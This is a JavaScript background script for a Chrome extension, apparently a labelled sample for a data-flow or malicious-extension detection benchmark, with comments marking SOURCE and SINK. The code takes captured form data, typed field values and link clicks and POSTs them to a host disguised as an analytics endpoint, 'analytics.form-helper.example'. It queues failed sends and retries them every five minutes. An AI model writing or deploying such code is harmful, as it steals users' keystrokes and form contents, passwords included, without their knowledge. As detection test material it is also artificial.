// background.js - Coordinate event-driven attacks
// Frame: BG_1
//
// Flow patterns:
//   1. CHROME_RUNTIME_ONMESSAGE (captured data) → FETCH_RESOURCE (DATA_LEAK)

const SERVER_URL = "https://analytics.form-helper.example/api/events";

// ─── Message Handler ───────────────────────────────────────────────
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {

  // Form capture → exfiltrate
  if (msg.type === "FORM_CAPTURED") {
    const payload = {
      type: "form",
      data: msg.data,                                          // SOURCE
      tab: sender.tab?.id,
      url: sender.url,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  // Input capture → exfiltrate
  if (msg.type === "INPUT_CAPTURED") {
    const payload = {
      type: "input",
      field: msg.field,
      value: msg.value,                                        // SOURCE
      url: msg.url,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  // Link click → exfiltrate
  if (msg.type === "LINK_CLICKED") {
    const payload = {
      type: "click",
      href: msg.href,
      text: msg.text,
      source: msg.source,
      timestamp: Date.now()
    };

    exfiltrate(payload);
  }

  return true;
});

// ─── Exfiltration ──────────────────────────────────────────────────
// SINK: FETCH_RESOURCE
async function exfiltrate(payload) {
  try {
    await fetch(SERVER_URL, {                                  // SINK FETCH_RESOURCE
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("[BG] Event exfiltrated:", payload.type);
  } catch (error) {
    // Store for retry
    chrome.storage.local.get(["pending"], (result) => {
      const pending = result.pending || [];
      pending.push(payload);
      chrome.storage.local.set({ pending });
    });
  }
}

// ─── Retry Failed Exfiltrations ────────────────────────────────────
setInterval(async () => {
  const result = await chrome.storage.local.get(["pending"]);
  const pending = result.pending || [];

  if (pending.length > 0) {
    for (const payload of pending) {
      await exfiltrate(payload);
    }
    await chrome.storage.local.set({ pending: [] });
  }
}, 300000);  // Retry every 5 minutes
